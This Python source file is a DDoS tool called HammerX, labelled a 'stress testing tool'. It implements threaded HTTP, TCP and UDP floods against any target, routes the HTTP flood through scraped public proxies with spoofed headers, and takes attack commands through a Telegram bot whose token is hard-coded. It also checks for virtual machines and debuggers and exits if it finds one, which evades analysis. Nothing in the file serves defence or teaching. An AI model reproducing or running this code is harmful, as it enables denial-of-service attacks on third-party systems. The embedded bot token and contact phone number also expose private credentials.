import argparse
import random
import socket
import threading
import time
import os
import sys
import platform
import requests
import json
from queue import Queue
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TimeElapsedColumn
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# === توكن البوت المضمن مباشرة ===
BOT_TOKEN = "8980281589:AAEqY4nk6POnwVwNJ85tZ4GKhh8j7fGbUgw"

console = Console()
proxies = Queue()
stats = {"sent": 0, "failed": 0}
stop_event = threading.Event()

BANNER = r'''
██╗░░██╗░█████╗░███╗░░░███╗███╗░░░███╗███████╗██████╗░██╗░░██╗
██║░░██║██╔══██╗████╗░████║████╗░████║██╔════╝██╔══██╗╚██╗██╔╝
███████║███████║██╔████╔██║██╔████╔██║█████╗░░██████╔╝░╚███╔╝░
██╔══██║██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝░░██╔══██╗░██╔██╗░
██║░░██║██║░░██║██║░╚═╝░██║██║░╚═╝░██║███████╗██║░░██║██╔╝╚██╗
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░░░░╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝
HammerX - Advanced DDoS Stress Testing Tool
Author: KiNG_CYReX
Contact: Telegram/WhatsApp +989903390280
'''

def is_virtual_machine():
    indicators = ["vbox", "vmware", "qemu", "virtual", "hyperv"]
    sysinfo = platform.platform().lower() + platform.node().lower()
    return any(indicator in sysinfo for indicator in indicators)

def is_debugged():
    return sys.gettrace() is not None

def is_safe():
    return not is_virtual_machine() and not is_debugged()

def load_proxies():
    try:
        if os.path.exists("proxies.txt"):
            with open("proxies.txt") as f:
                for line in f:
                    proxy = line.strip()
                    if proxy:
                        proxies.put(proxy)
        else:
            urls = [
                "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=1000&country=all",
                "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
            ]
            for url in urls:
                r = requests.get(url)
                for line in r.text.strip().split('\n'):
                    proxy = line.strip()
                    if proxy:
                        proxies.put(proxy)
        console.log(f"[green]Loaded {proxies.qsize()} proxies")
    except Exception as e:
        console.log(f"[red]Failed to load proxies: {e}")

def random_headers():
    return {
        "User-Agent": random.choice([
            "Mozilla/5.0", "Chrome/107.0", "Safari/537.36", "Opera/9.80"
        ]),
        "Referer": random.choice([
            "https://google.com", "https://bing.com", "https://yahoo.com"
        ]),
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "Accept-Encoding": "gzip, deflate, br"
    }

def http_attack(target, duration):
    end = time.time() + duration
    while time.time() < end and not stop_event.is_set():
        try:
            proxy = proxies.get() if not proxies.empty() else None
            if proxy:
                proxies.put(proxy)
                proxies_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
                requests.get(target, headers=random_headers(), proxies=proxies_dict, timeout=5)
            else:
                requests.get(target, headers=random_headers(), timeout=5)
            stats["sent"] += 1
        except:
            stats["failed"] += 1

def tcp_attack(ip, port, duration):
    end = time.time() + duration
    while time.time() < end and not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(os.urandom(1024))
            s.close()
            stats["sent"] += 1
        except:
            stats["failed"] += 1

def udp_attack(ip, port, duration):
    end = time.time() + duration
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < end and not stop_event.is_set():
        try:
            s.sendto(os.urandom(1024), (ip, port))
            stats["sent"] += 1
        except:
            stats["failed"] += 1

def reporter():
    with Progress(SpinnerColumn(), "[bold green]Running...", TimeElapsedColumn()) as progress:
        task = progress.add_task("ddos", total=None)
        while not stop_event.is_set():
            time.sleep(1)
        progress.stop()

def summary():
    table = Table(title="Attack Summary")
    table.add_column("Packets Sent", justify="right")
    table.add_column("Failed", justify="right")
    table.add_row(str(stats["sent"]), str(stats["failed"]))
    console.print(table)
    with open("attack_results.json", "w") as f:
        json.dump(stats, f, indent=2)

# --- دوال بوت تيليجرام التفاعلي ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🤖 أهلاً بك في بوت HammerX\n\n"
        "طريقة استخدام الأوامر:\n"
        "🔹 اختبار TCP:\n`/attack tcp <IP> <PORT> <DURATION>`\n"
        "🔹 اختبار UDP:\n`/attack udp <IP> <PORT> <DURATION>`\n"
        "🔹 اختبار HTTP:\n`/attack http <URL> <DURATION>`"
    )
    await update.message.reply_text(msg, parse_mode="Markdown")

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stats, stop_event
    args = context.args
    
    if len(args) < 3:
        await update.message.reply_text("❌ خطأ في الصيغة! مثال:\n`/attack tcp 127.0.0.1 32000 15`", parse_mode="Markdown")
        return

    mode = args[0].lower()
    target = args[1]
    
    try:
        if mode == "http":
            port = 80
            duration = int(args[2])
        else:
            port = int(args[2])
            duration = int(args[3]) if len(args) > 3 else 15
    except ValueError:
        await update.message.reply_text("❌ البورت والوقت يجب أن يكونا أرقاماً صحيحة!")
        return

    stats = {"sent": 0, "failed": 0}
    stop_event.clear()

    await update.message.reply_text(f"🚀 جاري بدء الاختبار ({mode.upper()}) على الهدف `{target}` لمدة `{duration}` ثانية...", parse_mode="Markdown")

    load_proxies()

    attack_func = {
        "http": lambda: http_attack(target, duration),
        "tcp": lambda: tcp_attack(target, port, duration),
        "udp": lambda: udp_attack(target, port, duration)
    }.get(mode)

    if not attack_func:
        await update.message.reply_text("❌ وضع الهجوم غير صحيح! اختر (tcp, udp, http).")
        return

    threads = []
    for _ in range(50):
        t = threading.Thread(target=attack_func)
        t.start()
        threads.append(t)

    time.sleep(duration)
    stop_event.set()

    for t in threads:
        t.join()

    summary()

    result_msg = (
        f"📊 **نتائج الاختبار ({mode.upper()}):**\n"
        f"✅ الحزم المرسلة: `{stats['sent']}`\n"
        f"❌ الحزم الفاشلة: `{stats['failed']}`"
    )
    await update.message.reply_text(result_msg, parse_mode="Markdown")

if __name__ == "__main__":
    print(BANNER)
    if not is_safe():
        console.log("[red]Stealth/Sandbox detected! Exiting...")
        sys.exit(1)

    # تشغيل بوت تيليجرام
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("attack", attack_command))
    print("Telegram Bot is running successfully...")
    app.run_polling()
